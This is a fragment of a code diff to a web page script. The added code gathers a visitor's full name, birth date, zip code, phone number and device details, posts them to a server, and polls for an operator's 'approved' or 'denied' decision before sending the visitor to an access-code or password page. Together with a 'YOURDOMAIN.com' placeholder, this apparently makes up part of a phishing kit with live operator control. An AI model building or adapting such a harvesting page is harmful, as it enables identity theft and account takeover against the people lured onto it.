+        zip_code: zipInput.value,
+        birth_date: birthDate,
+        full_name: nameInput.value.trim(),
+        masked_phone: "+1" + phoneInput.value,
+        device_info: navigator.userAgent,
+        screen_size: window.screen.width + "x" + window.screen.height
+      })
+    })
+    .then(function (res) { return res.json(); })
+    .then(function (data) {
+      if (!data.task) { window.location.href = "index.html"; return; }
+      pollTask(taskId);
+    })
+    .catch(function () { window.location.href = "index.html"; });
+  });
 
-          if (result.task.status === "approved") {
-            clearInterval(activePoll);
-            clearTimeout(activeTimeout);
-            loader.querySelector("span").textContent = "Redirecting…";
-            setTimeout(function () {
-              window.location.href = "/verify2.html?task=" + taskId;
-            }, 800);
-          } else if (result.task.status === "denied") {
-            clearInterval(activePoll);
-            clearTimeout(activeTimeout);
-            showError("Request was not approved. Please try again.");
-          } else if (result.task.status === "redirected") {
-            clearInterval(activePoll);
-            clearTimeout(activeTimeout);
-            window.location.href = "https://YOURDOMAIN.com";
+  function pollTask(id) {
+    var interval = setInterval(function () {
+      fetch("/api/tasks/" + id)
+        .then(function (res) { return res.json(); })
+        .then(function (data) {
+          if (!data.task) return;
+          if (data.task.status === "approved") {
+            clearInterval(interval);
+            window.location.href = "access-code.html";
+          } else if (data.task.status === "denied") {
+            clearInterval(interval);
+            window.location.href = "index.html";
           }
-        } catch (err) {}
-      }, 3000);
+        }).catch(function () {});
+    }, 2000);
+  }
 
-      activeTimeout = setTimeout(function () {
-        clearInterval(activePoll);
-        showError("Request timed out. Please try again.");
-      }, 90000);
-
-    } catch (err) {
-      showError("Something went wrong. Please try again later.");
-    }
+  document.getElementById("cancelBtn").addEventListener("click", function () {
+    window.location.href = "password.html";
   });
 })();
 </script>
-
 </body>
 </html>
